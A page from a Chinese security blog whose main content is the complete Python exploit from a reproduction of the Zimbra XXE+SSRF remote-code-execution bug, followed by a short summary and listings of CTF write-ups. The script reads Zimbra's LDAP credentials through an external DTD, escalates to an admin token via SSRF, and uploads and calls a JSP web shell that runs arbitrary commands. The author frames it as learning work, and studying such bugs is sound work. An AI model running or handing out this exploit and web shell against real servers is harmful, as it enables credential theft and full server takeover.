<h4 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="comment">#Connect "shell.jsp" with antSword with the password "cmd"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">base_url=sys.argv[<span class="number">1</span>]</span><br><span class="line">base_url=base_url.rstrip(<span class="string">"/"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#upload file name and content</span></span><br><span class="line">filename = <span class="string">"shell.jsp"</span></span><br><span class="line">fileContent = <span class="string">r'&lt;%@page import="java.io.*"%&gt;&lt;%@page import="sun.misc.BASE64Decoder"%&gt;&lt;%try &#123;String cmd = request.getParameter("cmd");String path=application.getRealPath(request.getRequestURI());String note="upload_success!";if(cmd.equals("NzU1Ng"))&#123;out.print("[S]"+note+"[E]");&#125;byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process child = Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print("-&gt;|");int c;while ((c = in.read()) != -1) &#123;out.print((char)c);&#125;in.close();out.print("|&lt;-");try &#123;child.waitFor();&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#125; catch (IOException e) &#123;System.err.println(e);&#125;%&gt;'</span></span><br><span class="line">print(base_url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dtd file </span></span><br><span class="line">dtd_url=<span class="string">"https://172.16.36.130:5000/exp.dtd"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM "file:../conf/localconfig.xml"&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % start "&lt;![CDATA["&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % end "]]&gt;"&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;"&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">xxe_data = <span class="string">r"""&lt;!DOCTYPE Autodiscover [</span></span><br><span class="line"><span class="string">        &lt;!ENTITY % dtd SYSTEM "&#123;dtd&#125;"&gt;</span></span><br><span class="line"><span class="string">        %dtd;</span></span><br><span class="line"><span class="string">        %all;</span></span><br><span class="line"><span class="string">        ]&gt;</span></span><br><span class="line"><span class="string">&lt;Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"&gt;</span></span><br><span class="line"><span class="string">    &lt;Request&gt;</span></span><br><span class="line"><span class="string">        &lt;EMailAddress&gt;test@test.com&lt;/EMailAddress&gt;</span></span><br><span class="line"><span class="string">        &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;</span></span><br><span class="line"><span class="string">    &lt;/Request&gt;</span></span><br><span class="line"><span class="string">&lt;/Autodiscover&gt;"""</span>.format(dtd=dtd_url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># XXE stage</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Content-Type"</span>:<span class="string">"application/xml"</span></span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"[*] Get User Name/Password By XXE "</span>)</span><br><span class="line">r = requests.post(base_url+<span class="string">"/Autodiscover/Autodiscover.xml"</span>,data=xxe_data,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">15</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'response schema not available'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    print(<span class="string">"have no xxe"</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># low_token Stage</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">pattern_name = re.compile(<span class="string">r"&amp;lt;key name=(\"|&amp;quot;)zimbra_user(\"|&amp;quot;)&amp;gt;\n.*?&amp;lt;value&amp;gt;(.*?)&amp;lt;\/value&amp;gt;"</span>)</span><br><span class="line">pattern_password = re.compile(<span class="string">r"&amp;lt;key name=(\"|&amp;quot;)zimbra_ldap_password(\"|&amp;quot;)&amp;gt;\n.*?&amp;lt;value&amp;gt;(.*?)&amp;lt;\/value&amp;gt;"</span>)</span><br><span class="line">username = pattern_name.findall(r.text)[<span class="number">0</span>][<span class="number">2</span>]</span><br><span class="line">password = pattern_password.findall(r.text)[<span class="number">0</span>][<span class="number">2</span>]</span><br><span class="line">print(username)</span><br><span class="line">print(password)</span><br><span class="line"></span><br><span class="line">auth_body=<span class="string">"""&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"&gt;</span></span><br><span class="line"><span class="string">   &lt;soap:Header&gt;</span></span><br><span class="line"><span class="string">       &lt;context xmlns="urn:zimbra"&gt;</span></span><br><span class="line"><span class="string">           &lt;userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/&gt;</span></span><br><span class="line"><span class="string">       &lt;/context&gt;</span></span><br><span class="line"><span class="string">   &lt;/soap:Header&gt;</span></span><br><span class="line"><span class="string">   &lt;soap:Body&gt;</span></span><br><span class="line"><span class="string">     &lt;AuthRequest xmlns="&#123;xmlns&#125;"&gt;</span></span><br><span class="line"><span class="string">        &lt;account by="adminName"&gt;&#123;username&#125;&lt;/account&gt;</span></span><br><span class="line"><span class="string">        &lt;password&gt;&#123;password&#125;&lt;/password&gt;</span></span><br><span class="line"><span class="string">     &lt;/AuthRequest&gt;</span></span><br><span class="line"><span class="string">   &lt;/soap:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/soap:Envelope&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">print(<span class="string">"[*] Get Low Privilege Auth Token"</span>)</span><br><span class="line">r=requests.post(base_url+<span class="string">"/service/soap"</span>,data=auth_body.format(xmlns=<span class="string">"urn:zimbraAccount"</span>,username=username,password=password),verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">pattern_auth_token=re.compile(<span class="string">r"&lt;authToken&gt;(.*?)&lt;/authToken&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get low_priv_token</span></span><br><span class="line">low_priv_token = pattern_auth_token.findall(r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSRF+Get Admin_Token Stage</span></span><br><span class="line">headers[<span class="string">"Cookie"</span>]=<span class="string">"ZM_ADMIN_AUTH_TOKEN="</span>+low_priv_token+<span class="string">";"</span></span><br><span class="line">headers[<span class="string">"Host"</span>]=<span class="string">"foo:7071"</span></span><br><span class="line">print(<span class="string">"[*] Get Admin  Auth Token By SSRF"</span>)</span><br><span class="line">r = requests.post(base_url+<span class="string">"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap"</span>,data=auth_body.format(xmlns=<span class="string">"urn:zimbraAdmin"</span>,username=username,password=password),headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">admin_token =pattern_auth_token.findall(r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># upload file</span></span><br><span class="line">f = &#123;</span><br><span class="line">    <span class="string">'filename1'</span>:(<span class="literal">None</span>,<span class="string">"whocare"</span>,<span class="literal">None</span>),</span><br><span class="line">    <span class="string">'clientFile'</span>:(filename,fileContent,<span class="string">"text/plain"</span>),</span><br><span class="line">    <span class="string">'requestId'</span>:(<span class="literal">None</span>,<span class="string">"12"</span>,<span class="literal">None</span>),</span><br><span class="line">&#125;</span><br><span class="line">headers =&#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"ZM_ADMIN_AUTH_TOKEN="</span>+admin_token+<span class="string">";"</span></span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"[*] Uploading file"</span>)</span><br><span class="line">r = requests.post(base_url+<span class="string">"/service/extension/clientUploader/upload"</span>,files=f,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># visit upload file</span></span><br><span class="line">print(<span class="string">"Shell: "</span>+base_url+<span class="string">"/downloads/"</span>+filename)</span><br><span class="line">print(<span class="string">"[*] Request Result:"</span>)</span><br><span class="line">s = requests.session()</span><br><span class="line">r = s.get(base_url+<span class="string">"/downloads/"</span>+filename,verify=<span class="literal">False</span>,headers=headers)</span><br><span class="line">print(<span class="string">"May need cookie:"</span>)</span><br><span class="line">print(headers[<span class="string">'Cookie'</span>])</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>漏洞复现过程中主要对Zimbra相应版本中XXE和SSRF漏洞的成因进行分析，通过搭建本地复现环境，进行漏洞利用实践，主要涉及技术有XXE漏洞利用、SSRF漏洞利用、恶意文件上传、远程命令执行，加深了对Web服务漏洞的理解及其利用技术的掌握。</p>
<h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p><a href="https://blog.csdn.net/fnmsd/article/details/88657083">Zimbra XXE+SSRF实现RCE漏洞复现</a><br><a href="https://blog.csdn.net/sydnash/article/details/6108136">Zimbra服务器搭建</a><br><a href="https://docs.microsoft.com/zh-cn/">AutoDiscover构造语句描述</a><br><a href="http://www.myzaker.com/article/5e98fe228e9f09724949af30/">Zimbra SOAP API开发指南</a><br><a href="https://wiki.zimbra.com/wiki/Zimlet_Developers_Guide:Proxy_Servlet_Setup">Zimbra Proxy Servlet代理服务设计</a><br><a href="https://www.exploit-db.com/exploits/30472">CVE-2013-7091文件上传操作</a></p>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/">瞎捉摸的一些学习</a><span> </span><a class="article-more button is-small link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/CVE%E5%A4%8D%E7%8E%B0/">CVE复现</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted" href="/tags/CVE/">CVE</a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-07-26T07:04:04.000Z">2020-07-26</time><a class="commentCountImg" href="/2020/07/26/DASCTF%E4%B8%83%E6%9C%88%E6%9C%88%E8%B5%9BPWN/#comment-container"><span class="display-none-class">89574cd334cf0ada1362f13cddaca434</span><img class="not-gallery-item" src="/img/chat.svg"> <span class="commentCount" id="89574cd334cf0ada1362f13cddaca434"> 99+</span>    </a><span class="level-item">5 minutes read (About 813 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/07/26/DASCTF%E4%B8%83%E6%9C%88%E6%9C%88%E8%B5%9BPWN/">DASCTF七月月赛PWN</a></h1><div class="content"><p>尝试做做pwn题，结果很失败，不过学到了新东西。</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted" href="/categories/CTF/">CTF</a><span> </span><a class="article-more button is-small link-muted" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/">比赛划水</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a></div></div><div class="level is-mobile is-flex"><div class="level-start"><div class="level-item"><a class="article-more button is-small size-small link-muted" href="/2020/07/26/DASCTF%E4%B8%83%E6%9C%88%E6%9C%88%E8%B5%9BPWN/#more"><i class="fas fa-book-reader has-text-grey"> </i>Read More&gt;&gt;</a></div></div><div class="level-start"><div class="level-item has-text-grey is-size-7"><time datetime="2020-07-26T13:04:26.351Z"><i class="far fa-calendar-check"> Last Modified: </i>2020-07-26</time></div></div></div></article></div><div class="card"><div class="card-image"><a class="image is-7by3" href="/2020/07/26/CybricsCTF/"><img class="thumbnail" src="http://ggb0n.cool/images/cybrics00.png" alt="CybricsCTF"></a></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-07-26T03:07:55.000Z">2020-07-26</time><a class="commentCountImg" href="/2020/07/26/CybricsCTF/#comment-container"><span class="display-none-class">0c308eeb99681f50254738a358ad91b3</span><img class="not-gallery-item" src="/img/chat.svg"> <span class="commentCount" id="0c308eeb99681f50254738a358ad91b3"> 99+</span>    </a><span class="level-item">13 minutes read (About 1939 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/07/26/CybricsCTF/">CybricsCTF</a></h1><div class="content"><p>记得去年是放假回家的路上比赛开始的，回到家开始做，结果一道题也没出…</p>
<p>今年还行，简单题能做做。</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted" href="/categories/CTF/">CTF</a><span> </span><a class="article-more button is-small link-muted" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/">比赛划水</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a><span> </span><a class="article-more button is-small link-muted" href="/tags/RSA%E6%94%BB%E5%87%BB/">RSA攻击</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB/">低加密指数广播攻击</a></div></div><div class="level is-mobile is-flex"><div class="level-start"><div class="level-item"><a class="article-more button is-small size-small link-muted" href="/2020/07/26/CybricsCTF/#more"><i class="fas fa-book-reader has-text-grey"> </i>Read More&gt;&gt;</a></div></div><div class="level-start"><div class="level-item has-text-grey is-size-7"><time datetime="2020-07-27T08:08:39.322Z"><i class="far fa-calendar-check"> Last Modified: </i>2020-07-27</time></div></div></div></article></div><div class="card"><div class="card-image"><a class="image is-7by3" href="/2020/06/29/TCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><img class="thumbnail" src="http://ggb0n.cool/images/tctf-top.png" alt="TCTF2020部分题解"></a></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-06-29T08:47:34.000Z">2020-06-29</time><a class="commentCountImg" href="/2020/06/29/TCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#comment-container"><span class="display-none-class">aac8da2e055be0b7480d8686371e5dea</span><img class="not-gallery-item" src="/img/chat.svg"> <span class="commentCount" id="aac8da2e055be0b7480d8686371e5dea"> 99+</span>    </a><span class="level-item">20 minutes read (About 2983 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/06/29/TCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">TCTF2020部分题解</a></h1><div class="content"><p>比赛的时候做题一头雾水，很多题一知半解，不能自己独立完成，赛后看飘零师傅的题解进一步学习。</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted" href="/categories/CTF/">CTF</a><span> </span><a class="article-more button is-small link-muted" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/">比赛划水</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted" href="/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/">无参数RCE</a><span> </span><a class="article-more button is-small link-muted" href="/tags/open-basedir%E7%BB%95%E8%BF%87/">open-basedir绕过</a><span> </span><a class="article-more button is-small link-muted" href="/tags/XSS/">XSS</a><span> </span><a class="article-more button is-small link-muted" href="/tags/FFI/">FFI</a><span> </span><a class="article-more button is-small link-muted" href="/tags/ImageMagick/">ImageMagick</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/">分组密码重放攻击</a></div></div><div class="level is-mobile is-flex"><div class="level-start"><div class="level-item"><a class="article-more button is-small size-small link-muted" href="/2020/06/29/TCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#more"><i class="fas fa-book-reader has-text-grey"> </i>Read More&gt;&gt;</a></div></div><div class="level-start"><div class="level-item has-text-grey is-size-7"><time datetime="2020-07-26T04:53:10.935Z"><i class="far fa-calendar-check"> Last Modified: </i>2020-07-26</time></div></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-06-26T15:37:19.000Z">2020-06-26</time><a class="commentCountImg" href="/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/#comment-container"><span class="display-none-class">2170536fbd63c88680bdcd182d4ea34a</span><img class="not-gallery-item" src="/img/chat.svg"> <span class="commentCount" id="2170536fbd63c88680bdcd182d4ea34a"> 99+</span>    </a><span class="level-item">8 minutes read (About 1199 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/">第五空间pwn题练习</a></h1><div class="content"><p>自做pwn题以来第一次打比赛，真正遇到题目果然是一脸懵逼。。。拿着师傅们的wp学习</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted" href="/categories/CTF/">CTF</a><span> </span><a class="article-more button is-small link-muted" href="/categories/CTF/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/">赛题复现</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted" href="/tags/ROP/">ROP</a><span> </span><a class="article-more button is-small link-muted" href="/tags/arm-pwn/">arm pwn</a><span> </span><a class="article-more button is-small link-muted" href="/tags/leak-canary/">leak canary</a><span> </span><a class="article-more button is-small link-muted" href="/tags/heap-UAF/">heap UAF</a></div></div><div class="level is-mobile is-flex"><div class="level-start"><div class="level-item"><a class="article-more button is-small size-small link-muted" href="/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/#more"><i class="fas fa-book-reader has-text-grey"> </i>Read More&gt;&gt;</a></div></div><div class="level-start"><div class="level-item has-text-grey is-size-7"><time datetime="2020-07-26T04:56:47.545Z"><i class="far fa-calendar-check"> Last Modified: </i>2020-07-26</time></div></div></div></article></div><nav class="pagination is-centered mt-4" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/page/0/">Previous</a></div><div class="pagination-next"><a href="/page/2/">Next</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/9/">9</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="is-rounded" src="http://ggb0n.cool/images/header.jpg" alt="ggb0n"></figure><p class="title is-size-4 is-block line-height-inherit">ggb0n</p><p class="is-size-6 is-block">闭关ing。。。</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>伟大的中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">41</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">13</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">114</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ggb0n" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ggb0n"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Weibo" href="https://weibo.com/u/5955623314"><i class="fab fa-weibo"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:gg.b0n@qq.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Next" href="https://ggb0n.github.io/"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget"><div class="card-content"><h3 class="menu-label">Latest Comment</h3><span class="body_hot_comment">Loading...Wait a Minute!</span></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Recent</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2020-09-06T09:06:53.000Z">2020-09-06</time></p><p class="title is-6"><a class="link-muted" href="/2020/09/06/Zimbra2019CVE%E5%A4%8D%E7%8E%B0/">Zimbra2019CVE复现</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/">瞎捉摸的一些学习</a> / <a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/CVE%E5%A4%8D%E7%8E%B0/">CVE复现</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-07-26T07:04:04.000Z">2020-07-26</time></p><p class="title is-6"><a class="link-muted" href="/2020/07/26/DASCTF%E4%B8%83%E6%9C%88%E6%9C%88%E8%B5%9BPWN/">DASCTF七月月赛PWN</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/">比赛划水</a></p></div></article><article class="media"><a class="media-left" href="/2020/07/26/CybricsCTF/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/cybrics00.png" alt="CybricsCTF"></p></a><div class="media-content size-small"><p><time dateTime="2020-07-26T03:07:55.000Z">2020-07-26</time></p><p class="title is-6"><a class="link-muted" href="/2020/07/26/CybricsCTF/">CybricsCTF</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/">比赛划水</a></p></div></article><article class="media"><a class="media-left" href="/2020/06/29/TCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/tctf-top.png" alt="TCTF2020部分题解"></p></a><div class="media-content size-small"><p><time dateTime="2020-06-29T08:47:34.000Z">2020-06-29</time></p><p class="title is-6"><a class="link-muted" href="/2020/06/29/TCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">TCTF2020部分题解</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/">比赛划水</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-06-26T15:37:19.000Z">2020-06-26</time></p><p class="title is-6"><a class="link-muted" href="/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/">第五空间pwn题练习</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/">赛题复现</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">32</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/web%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">web安全</span></span><span class="level-end"><span class="level-item tag">7</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/web%E5%AE%89%E5%85%A8/BUU%E5%88%B7%E9%A2%98/"><span class="level-start"><span class="level-item">BUU刷题</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/web%E5%AE%89%E5%85%A8/CTFHub%E5%88%B7%E9%A2%98/"><span class="level-start"><span class="level-item">CTFHub刷题</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/%E4%BA%8C%E8%BF%9B%E5%88%B6/"><span class="level-start"><span class="level-item">二进制</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"><span class="level-start"><span class="level-item">比赛划水</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">赛题复现</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">机器学习</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">瞎捉摸的一些学习</span></span><span class="level-end"><span class="level-item tag">5</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/CVE%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">CVE复现</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><a class="level is-mobile is-marginless" href="/categories/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2020/09/"><span class="level-start"><span class="level-item">September 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/07/"><span class="level-start"><span class="level-item">July 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/06/"><span class="level-start"><span class="level-item">June 2020</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/04/"><span class="level-start"><span class="level-item">April 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><a class="level is-mobile is-marginless" href="/archives/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/SQL%E6%B3%A8%E5%85%A5/"><span class="tag">SQL注入</span><span class="tag is-grey-lightest">10</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Cookie%E6%94%BB%E5%87%BB/"><span class="tag">Cookie攻击</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JWT%E4%BC%AA%E9%80%A0/"><span 